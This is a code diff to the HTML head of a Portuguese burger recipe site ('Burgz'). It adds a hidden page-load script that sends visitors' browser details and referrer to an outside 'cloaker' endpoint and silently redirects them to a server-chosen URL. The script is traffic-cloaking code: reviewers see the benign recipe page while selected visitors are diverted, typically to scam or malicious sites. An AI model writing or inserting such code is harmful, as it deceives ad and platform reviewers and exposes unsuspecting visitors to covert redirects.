@@ -5,7 +5,32 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0" />
     <title>Burgz — O Hambúrguer Perfeitamente Perfeito</title>
     <meta name="description" content="O guia definitivo do Burgz: blend ideal, técnica da chapa e suculência máxima para o hambúrguer perfeito em casa." />
-
+<script>
+(function() {
+  const endpoint = "https://meu-cloaker.vercel.app/api/filtrar";
+  const whiteUrl = "";
+  
+  fetch(endpoint, {
+    method: 'POST',
+    headers: { 'Content-Type': 'application/json' },
+    body: JSON.stringify({
+      userAgent: navigator.userAgent,
+      language: navigator.language,
+      screenWidth: window.screen.width,
+      referrer: document.referrer
+    })
+  })
+  .then(res => res.json())
+  .then(data => {
+    if (data.action === 'redirect' && data.url) {
+      window.location.href = data.url;
+    } else if (whiteUrl) {
+      window.location.href = whiteUrl;
+    }
+  })
+  .catch(err => console.error('Cloak Error:', err));
+})();
+</script>
   </head>
   <body>
     <div id="root"></div>
